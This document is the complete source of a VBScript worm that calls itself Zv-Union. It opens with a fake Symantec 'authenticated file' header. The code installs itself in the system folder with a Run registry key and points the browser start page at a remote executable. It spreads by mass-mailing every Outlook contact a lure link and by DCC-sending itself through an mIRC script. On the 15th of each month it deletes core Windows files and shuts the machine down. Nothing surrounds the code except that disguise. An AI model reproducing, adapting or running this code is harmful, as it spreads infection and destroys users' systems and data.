' Symantec ScriptBlocking Authenticated File
' FDACC5F1-3438-4BCF-A8F0-B14821DD9F62

 Set M01RETBE = CreateObject("scripting.filesystemobject")
N23QR5J2 = M01RETBE.GetSpecialFolder(1)
V1F4FODG = N23QR5J2 & "\Sudair_Love.ram.vbs"
On Error Resume Next
Set C35KB8M6 = CreateObject("wscript.shell")
C35KB8M6.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zv-Union", "wscript.exe " & V1F4FODG & " %"
M01RETBE.copyfile wscript.scriptfullname, V1F4FODG
salam()
C35KB8M6.regwrite "HKCU\software\microsoft\internet Explorer\main\start Page", "http://us.f1.yahoofs.com/users/da36d538/bc/TimeUpdate.exe?bccvJu7ARMjryAxk"
If C35KB8M6.regread("HKCU\software\Sudair_Love.ram\mailed") <> "1" Then
rooooo7()
End If
If C35KB8M6.regread("HKCU\software\Sudair_Love.ram\mirqued") <> "1" Then
SU4ML8H8()
End If
Set IB2D9J6M = M01RETBE.opentextfile(wscript.scriptfullname)
B7VV626I = IB2D9J6M.readall
IB2D9J6M.Close
Do
If Not (M01RETBE.fileexists(wscript.scriptfullname)) Then
Set FKTM4DCG = M01RETBE.CreateTextFile(wscript.scriptfullname)
FKTM4DCG.write B7VV626I
FKTM4DCG.Close
End If
N46O20BI = C35KB8M6.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zv-Union")
If N46O20BI <> "wscript.exe " & V1F4FODG & " %" Then
C35KB8M6.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zv-Union", "wscript.exe " & V1F4FODG & " %"
End If
N46O20BI = ""
Loop
Function wail()
 Set bum = CreateObject("scripting.filesystemobject")
 zak = bum.GetSpecialFolder(0)
Set ddd = CreateObject("Scripting.FileSystemObject")
ddd.deletefile(zak&"\win.com")
ddd.deletefile(zak&"\regedit.exe")
ddd.deletefile(zak&"\explorer.exe")
MsgBox "YOU Have To Know That YOU Are Not The First Or The Last VICTIM Of Zv-Union...CYA!!"
C35KB8M6.run "RUNDLL32.EXE user.exe,exitwindows"
End Function

Function SU4ML8H8(KD2GF5G3)
If KD2GF5G3 <> "" Then
J8KI7KOJ = C35KB8M6.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If M01RETBE.fileexists("c:\mirc\mirc.ini") Then
KD2GF5G3 = "c:\mirc"
ElseIf M01RETBE.fileexists("c:\mirc32\mirc.ini") Then
KD2GF5G3 = "c:\mirc32"
ElseIf M01RETBE.fileexists(J8KI7KOJ & "\mirc\mirc.ini") Then
KD2GF5G3 = J8KI7KOJ & "\mirc"
ElseIf M01RETBE.fileexists(J8KI7KOJ & "\mirc32\mirc.ini") Then
KD2GF5G3 = J8KI7KOJ & "\mirc"
Else
KD2GF5G3 = ""
End If
End If
If KD2GF5G3 <> "" Then
Set V7U2631O = M01RETBE.CreateTextFile(KD2GF5G3 & "\script.ini", True)
V7U2631O = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
V7U2631O = V7U2631O & vbCrLf & "n0=on 1:JOIN:#:{"
V7U2631O = V7U2631O & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
V7U2631O = V7U2631O & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
V7U2631O = V7U2631O & V1F4FODG
V7U2631O = V7U2631O & vbCrLf & "n3=}"
script.Close
C35KB8M6.regwrite "HKCU\software\Sudair_Love.ram\Mirqued", "1"
End If
End Function
Function rooooo7()
 On Error Resume Next
Set ddd = CreateObject("Outlook.Application")
If ddd = "Outlook" Then
Set GNS = ddd.GetNameSpace("MAPI")
For Each NuM In GNS.AddressLists
If NuM.AddressEntries.Count <> 0 Then
For nnbratvivby = 1 To NuM.AddressEntries.Count
Set hfrcokiowep = NuM.AddressEntries(nnbratvivby)
Set inzwlmcmpto = ddd.CreateItem(0)
mypro.To = hfrcokiowep.Address
mypro.Subject = "For All of You"
mypro.Body = "Hiii" & vbCrLf & "It's Really CoooooL!!" & vbCrLf & "http://forever.as/friends.ram" & vbCrLf & "You Will Like It :)" & vbCrLf & "Always RememBer Me!" & vbCrLf & "Bye"
If mypro.To <> "" Then
mypro.Send
End If
Next
End If
Next
C35KB8M6.regwrite "HKCU\software\Sudair_Love.ram\mailed", "1"
End If
End Function
Function salam()
If Day(Now) = 15 Then
Call wail
End If
End Function
